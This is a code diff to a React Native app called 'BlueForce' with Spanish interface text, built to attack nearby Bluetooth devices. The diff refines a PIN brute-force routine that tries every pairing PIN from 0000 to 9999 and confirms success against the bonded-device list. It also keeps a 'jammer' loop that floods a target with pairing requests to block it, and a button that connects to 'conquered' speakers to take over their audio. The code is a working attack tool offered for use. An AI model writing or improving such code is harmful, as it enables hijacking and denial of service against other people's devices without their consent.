@@ -4,8 +4,8 @@ import RNBluetoothClassic from 'react-native-bluetooth-classic';
 
 const SignalMeter = ({ rssi }) => {
   let strength = 0;
-  if (rssi > -50) strength = 5;
-  else if (rssi > -65) strength = 4;
+  if (rssi > -45) strength = 5;
+  else if (rssi > -60) strength = 4;
   else if (rssi > -75) strength = 3;
   else if (rssi > -85) strength = 2;
   else if (rssi > -100) strength = 1;
@@ -22,7 +22,6 @@ const SignalMeter = ({ rssi }) => {
 export default function App() {
   const [discoveredDevices, setDiscoveredDevices] = useState([]);
   const [history, setHistory] = useState({});
-  const [activeTarget, setActiveTarget] = useState(null);
   const [isScanning, setIsScanning] = useState(false);
   const [mode, setMode] = useState('IDLE');
   const [currentPin, setCurrentPin] = useState('0000');
@@ -53,60 +52,58 @@ export default function App() {
     try {
       const devices = await RNBluetoothClassic.startDiscovery();
       setDiscoveredDevices(devices.sort((a, b) => b.rssi - a.rssi));
-      addLog("✅ Escaneo finalizado.");
+      addLog("✅ Escaneo táctico completo.");
     } catch (err) { addLog(`⚠️ ERROR: ${err.message}`); }
     finally { setIsScanning(false); }
   };
 
   const startBruteForce = async (device) => {
-    setActiveTarget(device.address);
     setMode('BRUTE');
+    updateHistory(device.address, '⚔️ PROBANDO');
+    
     for (let i = 0; i <= 9999; i++) {
       let m; setMode(cur => { m = cur; return cur; });
       if (m !== 'BRUTE') break;
+
       const pin = i.toString().padStart(4, '0');
       setCurrentPin(pin);
+      
       try {
-        const ok = await RNBluetoothClassic.pairDevice(device.address, { pin });
-        if (ok) {
+        // Intentar vincular enviando el PIN
+        await RNBluetoothClassic.pairDevice(device.address, { pin });
+        
+        // VERIFICACIÓN CRUCIAL: ¿Realmente se vinculó?
+        // Esperamos un instante para que el sistema actualice el estado
+        await new Promise(r => setTimeout(r, 1500));
+        
+        const bonded = await RNBluetoothClassic.getBondedDevices();
+        const isActuallyBonded = bonded.some(d => d.address === device.address);
+
+        if (isActuallyBonded) {
+          addLog(`🎯 VÍNCULO REAL CONFIRMADO: ${pin}`);
           updateHistory(device.address, '🔓 CONQUISTADO', pin);
-          addLog("🎯 ENCONTRADO PIN: " + pin);
           setMode('IDLE');
-          setActiveTarget(null);
-          Alert.alert("¡ÉXITO!", `Vínculo creado con PIN: ${pin}. Ya puedes usar Spotify o YouTube.`);
+          Alert.alert("¡VÍNCULO EXITOSO!", `El parlante ahora es tu esclavo. PIN: ${pin}`);
           return;
+        } else {
+          addLog(`❌ PIN ${pin} rechazado por el hardware.`);
         }
       } catch (e) {
-        if (i % 5 === 0) await new Promise(r => setTimeout(r, 600));
+        // Fallo normal del Bluetooth
+        await new Promise(r => setTimeout(r, 800));
       }
     }
     setMode('IDLE');
-    setActiveTarget(null);
-  };
-
-  const syncAudio = async (device) => {
-    addLog(`🎵 Sincronizando Audio con ${device.address}...`);
-    try {
-      // Forzar conexión para perfil de audio (A2DP)
-      await RNBluetoothClassic.connectDevice(device.address);
-      addLog("🔥 AUDIO SINCRONIZADO. Pon tu música.");
-      Alert.alert("LISTO", "Canal de audio abierto. Abre YouTube o Spotify.");
-    } catch (e) {
-      addLog("⚠️ Reintento de sincronización...");
-      Alert.alert("AVISO", "Asegúrate de que el parlante no esté en uso por otra persona.");
-    }
   };
 
   const startJammer = async (device) => {
-    setActiveTarget(device.address);
     setMode('JAMMER');
-    addLog(`🔥 JAMMER activo contra ${device.address}`);
+    updateHistory(device.address, '🚫 BLOQUEADO');
     while (true) {
       let m; setMode(cur => { m = cur; return cur; });
       if (m !== 'JAMMER') break;
       try { await RNBluetoothClassic.pairDevice(device.address, { pin: '0' }); } catch (e) {}
     }
-    setActiveTarget(null);
   };
 
   const renderItem = ({ item }) => {
@@ -118,13 +115,13 @@ export default function App() {
       <View style={styles.card}>
         <SignalMeter rssi={item.rssi} />
         <View style={{ flex: 1, marginLeft: 15 }}>
-          <Text style={styles.name}>{item.name || "N/A"}</Text>
+          <Text style={styles.name}>{item.name || item.address}</Text>
           <Text style={styles.mac}>{item.address}</Text>
           <Text style={[styles.historyText, { color: isConquered ? '#00ff88' : '#888' }]}>{h.status}</Text>
         </View>
         <View style={{ flexDirection: 'row' }}>
           {isConquered ? (
-            <TouchableOpacity style={[styles.btnA, { backgroundColor: '#00f2ff' }]} onPress={() => syncAudio(item)}>
+            <TouchableOpacity style={[styles.btnA, { backgroundColor: '#00f2ff' }]} onPress={() => RNBluetoothClassic.connectDevice(item.address)}>
               <Text style={[styles.btnText, { color: '#000' }]}>AUD</Text>
             </TouchableOpacity>
           ) : (
@@ -144,14 +141,14 @@ export default function App() {
 
   return (
     <View style={styles.container}>
-      <Text style={styles.title}>BlueForce Command</Text>
+      <Text style={styles.title}>BlueForce Tactics</Text>
       <View style={styles.main}>
         <Text style={styles.pin}>{mode === 'IDLE' ? 'READY' : currentPin}</Text>
         <TouchableOpacity style={styles.scanBtn} onPress={scan} disabled={isScanning || mode !== 'IDLE'}>
           {isScanning ? <ActivityIndicator color="#fff" /> : <Text style={styles.scanText}>ESCANEAR AREA</Text>}
         </TouchableOpacity>
       </View>
-      <FlatList data={discoveredDevices} renderItem={renderItem} keyExtractor={i => i.address} />
+      <FlatList data={discoveredDevices} renderItem={renderItem} keyExtractor={i => i.address} style={{ flex: 1 }} />
       {mode !== 'IDLE' && <TouchableOpacity style={styles.stop} onPress={() => setMode('IDLE')}><Text style={styles.stopText}>ABORTAR</Text></TouchableOpacity>}
       <ScrollView style={styles.logs}>{logs.map((l, i) => <Text key={i} style={styles.logText}>{l}</Text>)}</ScrollView>
     </View>
@@ -160,7 +157,8 @@ export default function App() {
 
 const styles = StyleSheet.create({
   container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
-  title: { color: '#00f2ff', fontSize: 24, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
+  header: { marginBottom: 20 },
+  title: { color: '#00f2ff', fontSize: 24, fontWeight: 'bold' },
   main: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 20 },
   pin: { color: '#fff', fontSize: 40, fontWeight: 'bold', textAlign: 'center', marginBottom: 15 },
   scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
@@ -168,7 +166,7 @@ const styles = StyleSheet.create({
   card: { backgroundColor: '#181818', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
   name: { color: '#fff', fontWeight: 'bold', fontSize: 13 },
   mac: { color: '#555', fontSize: 9 },
-  historyText: { fontSize: 9, marginTop: 4, fontWeight: 'bold' },
+  historyText: { fontSize: 8, marginTop: 4, fontWeight: 'bold' },
   meterContainer: { flexDirection: 'row', alignItems: 'flex-end', width: 25 },
   bar: { width: 3, marginRight: 2, borderRadius: 1 },
   btnA: { backgroundColor: '#222', paddingVertical: 8, paddingHorizontal: 12, borderRadius: 8 },
